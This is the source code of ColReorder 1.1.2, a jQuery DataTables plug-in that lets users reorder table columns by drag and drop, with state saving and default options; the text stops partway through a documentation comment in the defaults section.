/*! ColReorder 1.1.2
 * ©2010-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     ColReorder
 * @description Provide the ability to reorder columns in a DataTable
 * @version     1.1.2
 * @file        dataTables.colReorder.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2010-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function(window, document, undefined) {


/**
 * Switch the key value pairing of an index array to be value key (i.e. the old value is now the
 * key). For example consider [ 2, 0, 1 ] this would be returned as [ 1, 2, 0 ].
 *  @method  fnInvertKeyValues
 *  @param   array aIn Array to switch around
 *  @returns array
 */
function fnInvertKeyValues( aIn )
{
	var aRet=[];
	for ( var i=0, iLen=aIn.length ; i<iLen ; i++ )
	{
		aRet[ aIn[i] ] = i;
	}
	return aRet;
}


/**
 * Modify an array by switching the position of two elements
 *  @method  fnArraySwitch
 *  @param   array aArray Array to consider, will be modified by reference (i.e. no return)
 *  @param   int iFrom From point
 *  @param   int iTo Insert point
 *  @returns void
 */
function fnArraySwitch( aArray, iFrom, iTo )
{
	var mStore = aArray.splice( iFrom, 1 )[0];
	aArray.splice( iTo, 0, mStore );
}


/**
 * Switch the positions of nodes in a parent node (note this is specifically designed for
 * table rows). Note this function considers all element nodes under the parent!
 *  @method  fnDomSwitch
 *  @param   string sTag Tag to consider
 *  @param   int iFrom Element to move
 *  @param   int Point to element the element to (before this point), can be null for append
 *  @returns void
 */
function fnDomSwitch( nParent, iFrom, iTo )
{
	var anTags = [];
	for ( var i=0, iLen=nParent.childNodes.length ; i<iLen ; i++ )
	{
		if ( nParent.childNodes[i].nodeType == 1 )
		{
			anTags.push( nParent.childNodes[i] );
		}
	}
	var nStore = anTags[ iFrom ];

	if ( iTo !== null )
	{
		nParent.insertBefore( nStore, anTags[iTo] );
	}
	else
	{
		nParent.appendChild( nStore );
	}
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * DataTables plug-in API functions
 *
 * This are required by ColReorder in order to perform the tasks required, and also keep this
 * code portable, to be used for other column reordering projects with DataTables, if needed.
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */


/**
 * Plug-in for DataTables which will reorder the internal column structure by taking the column
 * from one position (iFrom) and insert it into a given point (iTo).
 *  @method  $.fn.dataTableExt.oApi.fnColReorder
 *  @param   object oSettings DataTables settings object - automatically added by DataTables!
 *  @param   int iFrom Take the column to be repositioned from this point
 *  @param   int iTo and insert it into this point
 *  @returns void
 */
$.fn.dataTableExt.oApi.fnColReorder = function ( oSettings, iFrom, iTo )
{
	var v110 = $.fn.dataTable.Api ? true : false;
	var i, iLen, j, jLen, iCols=oSettings.aoColumns.length, nTrs, oCol;
	var attrMap = function ( obj, prop, mapping ) {
		if ( ! obj[ prop ] ) {
			return;
		}

		var a = obj[ prop ].split('.');
		var num = a.shift();

		if ( isNaN( num*1 ) ) {
			return;
		}

		obj[ prop ] = mapping[ num*1 ]+'.'+a.join('.');
	};

	/* Sanity check in the input */
	if ( iFrom == iTo )
	{
		/* Pointless reorder */
		return;
	}

	if ( iFrom < 0 || iFrom >= iCols )
	{
		this.oApi._fnLog( oSettings, 1, "ColReorder 'from' index is out of bounds: "+iFrom );
		return;
	}

	if ( iTo < 0 || iTo >= iCols )
	{
		this.oApi._fnLog( oSettings, 1, "ColReorder 'to' index is out of bounds: "+iTo );
		return;
	}

	/*
	 * Calculate the new column array index, so we have a mapping between the old and new
	 */
	var aiMapping = [];
	for ( i=0, iLen=iCols ; i<iLen ; i++ )
	{
		aiMapping[i] = i;
	}
	fnArraySwitch( aiMapping, iFrom, iTo );
	var aiInvertMapping = fnInvertKeyValues( aiMapping );


	/*
	 * Convert all internal indexing to the new column order indexes
	 */
	/* Sorting */
	for ( i=0, iLen=oSettings.aaSorting.length ; i<iLen ; i++ )
	{
		oSettings.aaSorting[i][0] = aiInvertMapping[ oSettings.aaSorting[i][0] ];
	}

	/* Fixed sorting */
	if ( oSettings.aaSortingFixed !== null )
	{
		for ( i=0, iLen=oSettings.aaSortingFixed.length ; i<iLen ; i++ )
		{
			oSettings.aaSortingFixed[i][0] = aiInvertMapping[ oSettings.aaSortingFixed[i][0] ];
		}
	}

	/* Data column sorting (the column which the sort for a given column should take place on) */
	for ( i=0, iLen=iCols ; i<iLen ; i++ )
	{
		oCol = oSettings.aoColumns[i];
		for ( j=0, jLen=oCol.aDataSort.length ; j<jLen ; j++ )
		{
			oCol.aDataSort[j] = aiInvertMapping[ oCol.aDataSort[j] ];
		}

		// Update the column indexes
		if ( v110 ) {
			oCol.idx = aiInvertMapping[ oCol.idx ];
		}
	}

	if ( v110 ) {
		// Update 1.10 optimised sort class removal variable
		$.each( oSettings.aLastSort, function (i, val) {
			oSettings.aLastSort[i].src = aiInvertMapping[ val.src ];
		} );
	}

	/* Update the Get and Set functions for each column */
	for ( i=0, iLen=iCols ; i<iLen ; i++ )
	{
		oCol = oSettings.aoColumns[i];

		if ( typeof oCol.mData == 'number' ) {
			oCol.mData = aiInvertMapping[ oCol.mData ];

			// regenerate the get / set functions
			oSettings.oApi._fnColumnOptions( oSettings, i, {} );
		}
		else if ( $.isPlainObject( oCol.mData ) ) {
			// HTML5 data sourced
			attrMap( oCol.mData, '_',      aiInvertMapping );
			attrMap( oCol.mData, 'filter', aiInvertMapping );
			attrMap( oCol.mData, 'sort',   aiInvertMapping );
			attrMap( oCol.mData, 'type',   aiInvertMapping );

			// regenerate the get / set functions
			oSettings.oApi._fnColumnOptions( oSettings, i, {} );
		}
	}


	/*
	 * Move the DOM elements
	 */
	if ( oSettings.aoColumns[iFrom].bVisible )
	{
		/* Calculate the current visible index and the point to insert the node before. The insert
		 * before needs to take into account that there might not be an element to insert before,
		 * in which case it will be null, and an appendChild should be used
		 */
		var iVisibleIndex = this.oApi._fnColumnIndexToVisible( oSettings, iFrom );
		var iInsertBeforeIndex = null;

		i = iTo < iFrom ? iTo : iTo + 1;
		while ( iInsertBeforeIndex === null && i < iCols )
		{
			iInsertBeforeIndex = this.oApi._fnColumnIndexToVisible( oSettings, i );
			i++;
		}

		/* Header */
		nTrs = oSettings.nTHead.getElementsByTagName('tr');
		for ( i=0, iLen=nTrs.length ; i<iLen ; i++ )
		{
			fnDomSwitch( nTrs[i], iVisibleIndex, iInsertBeforeIndex );
		}

		/* Footer */
		if ( oSettings.nTFoot !== null )
		{
			nTrs = oSettings.nTFoot.getElementsByTagName('tr');
			for ( i=0, iLen=nTrs.length ; i<iLen ; i++ )
			{
				fnDomSwitch( nTrs[i], iVisibleIndex, iInsertBeforeIndex );
			}
		}

		/* Body */
		for ( i=0, iLen=oSettings.aoData.length ; i<iLen ; i++ )
		{
			if ( oSettings.aoData[i].nTr !== null )
			{
				fnDomSwitch( oSettings.aoData[i].nTr, iVisibleIndex, iInsertBeforeIndex );
			}
		}
	}

	/*
	 * Move the internal array elements
	 */
	/* Columns */
	fnArraySwitch( oSettings.aoColumns, iFrom, iTo );

	/* Search columns */
	fnArraySwitch( oSettings.aoPreSearchCols, iFrom, iTo );

	/* Array array - internal data anodes cache */
	for ( i=0, iLen=oSettings.aoData.length ; i<iLen ; i++ )
	{
		var data = oSettings.aoData[i];

		if ( v110 ) {
			// DataTables 1.10+
			if ( data.anCells ) {
				fnArraySwitch( data.anCells, iFrom, iTo );
			}

			// For DOM sourced data, the invalidate will reread the cell into
			// the data array, but for data sources as an array, they need to
			// be flipped
			if ( data.src !== 'dom' && $.isArray( data._aData ) ) {
				fnArraySwitch( data._aData, iFrom, iTo );
			}
		}
		else {
			// DataTables 1.9-
			if ( $.isArray( data._aData ) ) {
				fnArraySwitch( data._aData, iFrom, iTo );
			}
			fnArraySwitch( data._anHidden, iFrom, iTo );
		}
	}

	/* Reposition the header elements in the header layout array */
	for ( i=0, iLen=oSettings.aoHeader.length ; i<iLen ; i++ )
	{
		fnArraySwitch( oSettings.aoHeader[i], iFrom, iTo );
	}

	if ( oSettings.aoFooter !== null )
	{
		for ( i=0, iLen=oSettings.aoFooter.length ; i<iLen ; i++ )
		{
			fnArraySwitch( oSettings.aoFooter[i], iFrom, iTo );
		}
	}

	// In 1.10 we need to invalidate row cached data for sorting, filtering etc
	if ( v110 ) {
		var api = new $.fn.dataTable.Api( oSettings );
		api.rows().invalidate();
	}

	/*
	 * Update DataTables' event handlers
	 */

	/* Sort listener */
	for ( i=0, iLen=iCols ; i<iLen ; i++ )
	{
		$(oSettings.aoColumns[i].nTh).off('click.DT');
		this.oApi._fnSortAttachListener( oSettings, oSettings.aoColumns[i].nTh, i );
	}


	/* Fire an event so other plug-ins can update */
	$(oSettings.oInstance).trigger( 'column-reorder', [ oSettings, {
		"iFrom": iFrom,
		"iTo": iTo,
		"aiInvertMapping": aiInvertMapping
	} ] );
};



var factory = function( $, DataTable ) {
"use strict";

/**
 * ColReorder provides column visibility control for DataTables
 * @class ColReorder
 * @constructor
 * @param {object} dt DataTables settings object
 * @param {object} opts ColReorder options
 */
var ColReorder = function( dt, opts )
{
	var oDTSettings;

	if ( $.fn.dataTable.Api ) {
		oDTSettings = new $.fn.dataTable.Api( dt ).settings()[0];
	}
	// 1.9 compatibility
	else if ( dt.fnSettings ) {
		// DataTables object, convert to the settings object
		oDTSettings = dt.fnSettings();
	}
	else if ( typeof dt === 'string' ) {
		// jQuery selector
		if ( $.fn.dataTable.fnIsDataTable( $(dt)[0] ) ) {
			oDTSettings = $(dt).eq(0).dataTable().fnSettings();
		}
	}
	else if ( dt.nodeName && dt.nodeName.toLowerCase() === 'table' ) {
		// Table node
		if ( $.fn.dataTable.fnIsDataTable( dt.nodeName ) ) {
			oDTSettings = $(dt.nodeName).dataTable().fnSettings();
		}
	}
	else if ( dt instanceof jQuery ) {
		// jQuery object
		if ( $.fn.dataTable.fnIsDataTable( dt[0] ) ) {
			oDTSettings = dt.eq(0).dataTable().fnSettings();
		}
	}
	else {
		// DataTables settings object
		oDTSettings = dt;
	}

	// Convert from camelCase to Hungarian, just as DataTables does
	var camelToHungarian = $.fn.dataTable.camelToHungarian;
	if ( camelToHungarian ) {
		camelToHungarian( ColReorder.defaults, ColReorder.defaults, true );
		camelToHungarian( ColReorder.defaults, opts || {} );
	}


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public class variables
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * @namespace Settings object which contains customisable information for ColReorder instance
	 */
	this.s = {
		/**
		 * DataTables settings object
		 *  @property dt
		 *  @type     Object
		 *  @default  null
		 */
		"dt": null,

		/**
		 * Initialisation object used for this instance
		 *  @property init
		 *  @type     object
		 *  @default  {}
		 */
		"init": $.extend( true, {}, ColReorder.defaults, opts ),

		/**
		 * Number of columns to fix (not allow to be reordered)
		 *  @property fixed
		 *  @type     int
		 *  @default  0
		 */
		"fixed": 0,

		/**
		 * Number of columns to fix counting from right (not allow to be reordered)
		 *  @property fixedRight
		 *  @type     int
		 *  @default  0
		 */
		"fixedRight": 0,

		/**
		 * Callback function for once the reorder has been done
		 *  @property dropcallback
		 *  @type     function
		 *  @default  null
		 */
		"dropCallback": null,

		/**
		 * @namespace Information used for the mouse drag
		 */
		"mouse": {
			"startX": -1,
			"startY": -1,
			"offsetX": -1,
			"offsetY": -1,
			"target": -1,
			"targetIndex": -1,
			"fromIndex": -1
		},

		/**
		 * Information which is used for positioning the insert cusor and knowing where to do the
		 * insert. Array of objects with the properties:
		 *   x: x-axis position
		 *   to: insert point
		 *  @property aoTargets
		 *  @type     array
		 *  @default  []
		 */
		"aoTargets": []
	};


	/**
	 * @namespace Common and useful DOM elements for the class instance
	 */
	this.dom = {
		/**
		 * Dragging element (the one the mouse is moving)
		 *  @property drag
		 *  @type     element
		 *  @default  null
		 */
		"drag": null,

		/**
		 * The insert cursor
		 *  @property pointer
		 *  @type     element
		 *  @default  null
		 */
		"pointer": null
	};


	/* Constructor logic */
	this.s.dt = oDTSettings.oInstance.fnSettings();
	this.s.dt._colReorder = this;
	this._fnConstruct();

	/* Add destroy callback */
	oDTSettings.oApi._fnCallbackReg(oDTSettings, 'aoDestroyCallback', $.proxy(this._fnDestroy, this), 'ColReorder');

	return this;
};



ColReorder.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Reset the column ordering to the original ordering that was detected on
	 * start up.
	 *  @return {this} Returns `this` for chaining.
	 *
	 *  @example
	 *    // DataTables initialisation with ColReorder
	 *    var table = $('#example').dataTable( {
	 *        "sDom": 'Rlfrtip'
	 *    } );
	 *
	 *    // Add click event to a button to reset the ordering
	 *    $('#resetOrdering').click( function (e) {
	 *        e.preventDefault();
	 *        $.fn.dataTable.ColReorder( table ).fnReset();
	 *    } );
	 */
	"fnReset": function ()
	{
		var a = [];
		for ( var i=0, iLen=this.s.dt.aoColumns.length ; i<iLen ; i++ )
		{
			a.push( this.s.dt.aoColumns[i]._ColReorder_iOrigCol );
		}

		this._fnOrderColumns( a );

		return this;
	},

	/**
	 * `Deprecated` - Get the current order of the columns, as an array.
	 *  @return {array} Array of column identifiers
	 *  @deprecated `fnOrder` should be used in preference to this method.
	 *      `fnOrder` acts as a getter/setter.
	 */
	"fnGetCurrentOrder": function ()
	{
		return this.fnOrder();
	},

	/**
	 * Get the current order of the columns, as an array. Note that the values
	 * given in the array are unique identifiers for each column. Currently
	 * these are the original ordering of the columns that was detected on
	 * start up, but this could potentially change in future.
	 *  @return {array} Array of column identifiers
	 *
	 *  @example
	 *    // Get column ordering for the table
	 *    var order = $.fn.dataTable.ColReorder( dataTable ).fnOrder();
	 *//**
	 * Set the order of the columns, from the positions identified in the
	 * ordering array given. Note that ColReorder takes a brute force approach
	 * to reordering, so it is possible multiple reordering events will occur
	 * before the final order is settled upon.
	 *  @param {array} [set] Array of column identifiers in the new order. Note
	 *    that every column must be included, uniquely, in this array.
	 *  @return {this} Returns `this` for chaining.
	 *
	 *  @example
	 *    // Swap the first and second columns
	 *    $.fn.dataTable.ColReorder( dataTable ).fnOrder( [1, 0, 2, 3, 4] );
	 *
	 *  @example
	 *    // Move the first column to the end for the table `#example`
	 *    var curr = $.fn.dataTable.ColReorder( '#example' ).fnOrder();
	 *    var first = curr.shift();
	 *    curr.push( first );
	 *    $.fn.dataTable.ColReorder( '#example' ).fnOrder( curr );
	 *
	 *  @example
	 *    // Reverse the table's order
	 *    $.fn.dataTable.ColReorder( '#example' ).fnOrder(
	 *      $.fn.dataTable.ColReorder( '#example' ).fnOrder().reverse()
	 *    );
	 */
	"fnOrder": function ( set )
	{
		if ( set === undefined )
		{
			var a = [];
			for ( var i=0, iLen=this.s.dt.aoColumns.length ; i<iLen ; i++ )
			{
				a.push( this.s.dt.aoColumns[i]._ColReorder_iOrigCol );
			}
			return a;
		}

		this._fnOrderColumns( fnInvertKeyValues( set ) );

		return this;
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods (they are of course public in JS, but recommended as private)
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Constructor logic
	 *  @method  _fnConstruct
	 *  @returns void
	 *  @private
	 */
	"_fnConstruct": function ()
	{
		var that = this;
		var iLen = this.s.dt.aoColumns.length;
		var i;

		/* Columns discounted from reordering - counting left to right */
		if ( this.s.init.iFixedColumns )
		{
			this.s.fixed = this.s.init.iFixedColumns;
		}

		/* Columns discounted from reordering - counting right to left */
		this.s.fixedRight = this.s.init.iFixedColumnsRight ?
			this.s.init.iFixedColumnsRight :
			0;

		/* Drop callback initialisation option */
		if ( this.s.init.fnReorderCallback )
		{
			this.s.dropCallback = this.s.init.fnReorderCallback;
		}

		/* Add event handlers for the drag and drop, and also mark the original column order */
		for ( i = 0; i < iLen; i++ )
		{
			if ( i > this.s.fixed-1 && i < iLen - this.s.fixedRight )
			{
				this._fnMouseListener( i, this.s.dt.aoColumns[i].nTh );
			}

			/* Mark the original column order for later reference */
			this.s.dt.aoColumns[i]._ColReorder_iOrigCol = i;
		}

		/* State saving */
		this.s.dt.oApi._fnCallbackReg( this.s.dt, 'aoStateSaveParams', function (oS, oData) {
			that._fnStateSave.call( that, oData );
		}, "ColReorder_State" );

		/* An initial column order has been specified */
		var aiOrder = null;
		if ( this.s.init.aiOrder )
		{
			aiOrder = this.s.init.aiOrder.slice();
		}

		/* State loading, overrides the column order given */
		if ( this.s.dt.oLoadedState && typeof this.s.dt.oLoadedState.ColReorder != 'undefined' &&
		  this.s.dt.oLoadedState.ColReorder.length == this.s.dt.aoColumns.length )
		{
			aiOrder = this.s.dt.oLoadedState.ColReorder;
		}

		/* If we have an order to apply - do so */
		if ( aiOrder )
		{
			/* We might be called during or after the DataTables initialisation. If before, then we need
			 * to wait until the draw is done, if after, then do what we need to do right away
			 */
			if ( !that.s.dt._bInitComplete )
			{
				var bDone = false;
				this.s.dt.aoDrawCallback.push( {
					"fn": function () {
						if ( !that.s.dt._bInitComplete && !bDone )
						{
							bDone = true;
							var resort = fnInvertKeyValues( aiOrder );
							that._fnOrderColumns.call( that, resort );
						}
					},
					"sName": "ColReorder_Pre"
				} );
			}
			else
			{
				var resort = fnInvertKeyValues( aiOrder );
				that._fnOrderColumns.call( that, resort );
			}
		}
		else {
			this._fnSetColumnIndexes();
		}
	},


	/**
	 * Set the column order from an array
	 *  @method  _fnOrderColumns
	 *  @param   array a An array of integers which dictate the column order that should be applied
	 *  @returns void
	 *  @private
	 */
	"_fnOrderColumns": function ( a )
	{
		if ( a.length != this.s.dt.aoColumns.length )
		{
			this.s.dt.oInstance.oApi._fnLog( this.s.dt, 1, "ColReorder - array reorder does not "+
				"match known number of columns. Skipping." );
			return;
		}

		for ( var i=0, iLen=a.length ; i<iLen ; i++ )
		{
			var currIndex = $.inArray( i, a );
			if ( i != currIndex )
			{
				/* Reorder our switching array */
				fnArraySwitch( a, currIndex, i );

				/* Do the column reorder in the table */
				this.s.dt.oInstance.fnColReorder( currIndex, i );
			}
		}

		/* When scrolling we need to recalculate the column sizes to allow for the shift */
		if ( this.s.dt.oScroll.sX !== "" || this.s.dt.oScroll.sY !== "" )
		{
			this.s.dt.oInstance.fnAdjustColumnSizing();
		}

		/* Save the state */
		this.s.dt.oInstance.oApi._fnSaveState( this.s.dt );

		this._fnSetColumnIndexes();
	},


	/**
	 * Because we change the indexes of columns in the table, relative to their starting point
	 * we need to reorder the state columns to what they are at the starting point so we can
	 * then rearrange them again on state load!
	 *  @method  _fnStateSave
	 *  @param   object oState DataTables state
	 *  @returns string JSON encoded cookie string for DataTables
	 *  @private
	 */
	"_fnStateSave": function ( oState )
	{
		var i, iLen, aCopy, iOrigColumn;
		var oSettings = this.s.dt;
		var columns = oSettings.aoColumns;

		oState.ColReorder = [];

		/* Sorting */
		if ( oState.aaSorting ) {
			// 1.10.0-
			for ( i=0 ; i<oState.aaSorting.length ; i++ ) {
				oState.aaSorting[i][0] = columns[ oState.aaSorting[i][0] ]._ColReorder_iOrigCol;
			}

			var aSearchCopy = $.extend( true, [], oState.aoSearchCols );

			for ( i=0, iLen=columns.length ; i<iLen ; i++ )
			{
				iOrigColumn = columns[i]._ColReorder_iOrigCol;

				/* Column filter */
				oState.aoSearchCols[ iOrigColumn ] = aSearchCopy[i];

				/* Visibility */
				oState.abVisCols[ iOrigColumn ] = columns[i].bVisible;

				/* Column reordering */
				oState.ColReorder.push( iOrigColumn );
			}
		}
		else if ( oState.order ) {
			// 1.10.1+
			for ( i=0 ; i<oState.order.length ; i++ ) {
				oState.order[i][0] = columns[ oState.order[i][0] ]._ColReorder_iOrigCol;
			}

			var stateColumnsCopy = $.extend( true, [], oState.columns );

			for ( i=0, iLen=columns.length ; i<iLen ; i++ )
			{
				iOrigColumn = columns[i]._ColReorder_iOrigCol;

				/* Columns */
				oState.columns[ iOrigColumn ] = stateColumnsCopy[i];

				/* Column reordering */
				oState.ColReorder.push( iOrigColumn );
			}
		}
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Mouse drop and drag
	 */

	/**
	 * Add a mouse down listener to a particluar TH element
	 *  @method  _fnMouseListener
	 *  @param   int i Column index
	 *  @param   element nTh TH element clicked on
	 *  @returns void
	 *  @private
	 */
	"_fnMouseListener": function ( i, nTh )
	{
		var that = this;
		$(nTh).on( 'mousedown.ColReorder', function (e) {
			e.preventDefault();
			that._fnMouseDown.call( that, e, nTh );
		} );
	},


	/**
	 * Mouse down on a TH element in the table header
	 *  @method  _fnMouseDown
	 *  @param   event e Mouse event
	 *  @param   element nTh TH element to be dragged
	 *  @returns void
	 *  @private
	 */
	"_fnMouseDown": function ( e, nTh )
	{
		var that = this;

		/* Store information about the mouse position */
		var target = $(e.target).closest('th, td');
		var offset = target.offset();
		var idx = parseInt( $(nTh).attr('data-column-index'), 10 );

		if ( idx === undefined ) {
			return;
		}

		this.s.mouse.startX = e.pageX;
		this.s.mouse.startY = e.pageY;
		this.s.mouse.offsetX = e.pageX - offset.left;
		this.s.mouse.offsetY = e.pageY - offset.top;
		this.s.mouse.target = this.s.dt.aoColumns[ idx ].nTh;//target[0];
		this.s.mouse.targetIndex = idx;
		this.s.mouse.fromIndex = idx;

		this._fnRegions();

		/* Add event handlers to the document */
		$(document)
			.on( 'mousemove.ColReorder', function (e) {
				that._fnMouseMove.call( that, e );
			} )
			.on( 'mouseup.ColReorder', function (e) {
				that._fnMouseUp.call( that, e );
			} );
	},


	/**
	 * Deal with a mouse move event while dragging a node
	 *  @method  _fnMouseMove
	 *  @param   event e Mouse event
	 *  @returns void
	 *  @private
	 */
	"_fnMouseMove": function ( e )
	{
		var that = this;

		if ( this.dom.drag === null )
		{
			/* Only create the drag element if the mouse has moved a specific distance from the start
			 * point - this allows the user to make small mouse movements when sorting and not have a
			 * possibly confusing drag element showing up
			 */
			if ( Math.pow(
				Math.pow(e.pageX - this.s.mouse.startX, 2) +
				Math.pow(e.pageY - this.s.mouse.startY, 2), 0.5 ) < 5 )
			{
				return;
			}
			this._fnCreateDragNode();
		}

		/* Position the element - we respect where in the element the click occured */
		this.dom.drag.css( {
			left: e.pageX - this.s.mouse.offsetX,
			top: e.pageY - this.s.mouse.offsetY
		} );

		/* Based on the current mouse position, calculate where the insert should go */
		var bSet = false;
		var lastToIndex = this.s.mouse.toIndex;

		for ( var i=1, iLen=this.s.aoTargets.length ; i<iLen ; i++ )
		{
			if ( e.pageX < this.s.aoTargets[i-1].x + ((this.s.aoTargets[i].x-this.s.aoTargets[i-1].x)/2) )
			{
				this.dom.pointer.css( 'left', this.s.aoTargets[i-1].x );
				this.s.mouse.toIndex = this.s.aoTargets[i-1].to;
				bSet = true;
				break;
			}
		}

		// The insert element wasn't positioned in the array (less than
		// operator), so we put it at the end
		if ( !bSet )
		{
			this.dom.pointer.css( 'left', this.s.aoTargets[this.s.aoTargets.length-1].x );
			this.s.mouse.toIndex = this.s.aoTargets[this.s.aoTargets.length-1].to;
		}

		// Perform reordering if realtime updating is on and the column has moved
		if ( this.s.init.bRealtime && lastToIndex !== this.s.mouse.toIndex ) {
			this.s.dt.oInstance.fnColReorder( this.s.mouse.fromIndex, this.s.mouse.toIndex );
			this.s.mouse.fromIndex = this.s.mouse.toIndex;
			this._fnRegions();
		}
	},


	/**
	 * Finish off the mouse drag and insert the column where needed
	 *  @method  _fnMouseUp
	 *  @param   event e Mouse event
	 *  @returns void
	 *  @private
	 */
	"_fnMouseUp": function ( e )
	{
		var that = this;

		$(document).off( 'mousemove.ColReorder mouseup.ColReorder' );

		if ( this.dom.drag !== null )
		{
			/* Remove the guide elements */
			this.dom.drag.remove();
			this.dom.pointer.remove();
			this.dom.drag = null;
			this.dom.pointer = null;

			/* Actually do the reorder */
			this.s.dt.oInstance.fnColReorder( this.s.mouse.fromIndex, this.s.mouse.toIndex );
			this._fnSetColumnIndexes();

			/* When scrolling we need to recalculate the column sizes to allow for the shift */
			if ( this.s.dt.oScroll.sX !== "" || this.s.dt.oScroll.sY !== "" )
			{
				this.s.dt.oInstance.fnAdjustColumnSizing();
			}

			if ( this.s.dropCallback !== null )
			{
				this.s.dropCallback.call( this );
			}

			/* Save the state */
			this.s.dt.oInstance.oApi._fnSaveState( this.s.dt );
		}
	},


	/**
	 * Calculate a cached array with the points of the column inserts, and the
	 * 'to' points
	 *  @method  _fnRegions
	 *  @returns void
	 *  @private
	 */
	"_fnRegions": function ()
	{
		var aoColumns = this.s.dt.aoColumns;

		this.s.aoTargets.splice( 0, this.s.aoTargets.length );

		this.s.aoTargets.push( {
			"x":  $(this.s.dt.nTable).offset().left,
			"to": 0
		} );

		var iToPoint = 0;
		for ( var i=0, iLen=aoColumns.length ; i<iLen ; i++ )
		{
			/* For the column / header in question, we want it's position to remain the same if the
			 * position is just to it's immediate left or right, so we only incremement the counter for
			 * other columns
			 */
			if ( i != this.s.mouse.fromIndex )
			{
				iToPoint++;
			}

			if ( aoColumns[i].bVisible )
			{
				this.s.aoTargets.push( {
					"x":  $(aoColumns[i].nTh).offset().left + $(aoColumns[i].nTh).outerWidth(),
					"to": iToPoint
				} );
			}
		}

		/* Disallow columns for being reordered by drag and drop, counting right to left */
		if ( this.s.fixedRight !== 0 )
		{
			this.s.aoTargets.splice( this.s.aoTargets.length - this.s.fixedRight );
		}

		/* Disallow columns for being reordered by drag and drop, counting left to right */
		if ( this.s.fixed !== 0 )
		{
			this.s.aoTargets.splice( 0, this.s.fixed );
		}
	},


	/**
	 * Copy the TH element that is being drags so the user has the idea that they are actually
	 * moving it around the page.
	 *  @method  _fnCreateDragNode
	 *  @returns void
	 *  @private
	 */
	"_fnCreateDragNode": function ()
	{
		var scrolling = this.s.dt.oScroll.sX !== "" || this.s.dt.oScroll.sY !== "";

		var origCell = this.s.dt.aoColumns[ this.s.mouse.targetIndex ].nTh;
		var origTr = origCell.parentNode;
		var origThead = origTr.parentNode;
		var origTable = origThead.parentNode;
		var cloneCell = $(origCell).clone();

		// This is a slightly odd combination of jQuery and DOM, but it is the
		// fastest and least resource intensive way I could think of cloning
		// the table with just a single header cell in it.
		this.dom.drag = $(origTable.cloneNode(false))
			.addClass( 'DTCR_clonedTable' )
			.append(
				origThead.cloneNode(false).appendChild(
					origTr.cloneNode(false).appendChild(
						cloneCell[0]
					)
				)
			)
			.css( {
				position: 'absolute',
				top: 0,
				left: 0,
				width: $(origCell).outerWidth(),
				height: $(origCell).outerHeight()
			} )
			.appendTo( 'body' );

		this.dom.pointer = $('<div></div>')
			.addClass( 'DTCR_pointer' )
			.css( {
				position: 'absolute',
				top: scrolling ?
					$('div.dataTables_scroll', this.s.dt.nTableWrapper).offset().top :
					$(this.s.dt.nTable).offset().top,
				height : scrolling ?
					$('div.dataTables_scroll', this.s.dt.nTableWrapper).height() :
					$(this.s.dt.nTable).height()
			} )
			.appendTo( 'body' );
	},

	/**
	 * Clean up ColReorder memory references and event handlers
	 *  @method  _fnDestroy
	 *  @returns void
	 *  @private
	 */
	"_fnDestroy": function ()
	{
		var i, iLen;

		for ( i=0, iLen=this.s.dt.aoDrawCallback.length ; i<iLen ; i++ )
		{
			if ( this.s.dt.aoDrawCallback[i].sName === 'ColReorder_Pre' )
			{
				this.s.dt.aoDrawCallback.splice( i, 1 );
				break;
			}
		}

		$(this.s.dt.nTHead).find( '*' ).off( '.ColReorder' );

		$.each( this.s.dt.aoColumns, function (i, column) {
			$(column.nTh).removeAttr('data-column-index');
		} );

		this.s.dt._colReorder = null;
		this.s = null;
	},


	/**
	 * Add a data attribute to the column headers, so we know the index of
	 * the row to be reordered. This allows fast detection of the index, and
	 * for this plug-in to work with FixedHeader which clones the nodes.
	 *  @private
	 */
	"_fnSetColumnIndexes": function ()
	{
		$.each( this.s.dt.aoColumns, function (i, column) {
			$(column.nTh).attr('data-column-index', i);
		} );
	}
};





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Static parameters
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */


/**
 * ColReorder default settings for initialisation
 *  @namespace
 *  @static
 */
ColReorder.defaults = {
	/**
	 * Predefined ordering for the columns that will be applied automatically
	 * on initialisation. If not specified then the order that the columns are
	 * found to be in the HTML is the order used.
	 *  @type array
	 *  @default null
	 *  @static
	 *  @example
	 *      // Using the `oColReorder` option in the DataTables options object
	 *      $('#example').dataTable( {
	 *          "sDom": 'Rlfrtip',
	 *          "oColReorder": {
	 *              "aiOrder": [ 4, 3, 2, 1, 0 ]
	 *          }
	 *      } );
	 *
	 *  @example
	 *      // Using `new` constructor
	 *      $('#example').dataTable()
	 *
	 *      new $.fn.dataTable.ColReorder( '#example', {
	 *          "aiOrder": [ 4, 3, 2, 1, 0 ]
	 *      } );
	 */
	aiOrder: null,

	/**
	 * Redraw the table's column ordering as the end user draws the column
	 * (`true`) or wait until the mouse is released (`false` - default). Note
	 * that this will perform a redraw on each reordering, which involves an
	 * Ajax request each time if you are using server-side processing in
	 * DataTables.
	 *  @type boolean
	 *  @default false
	 *  @static
	 *  @example
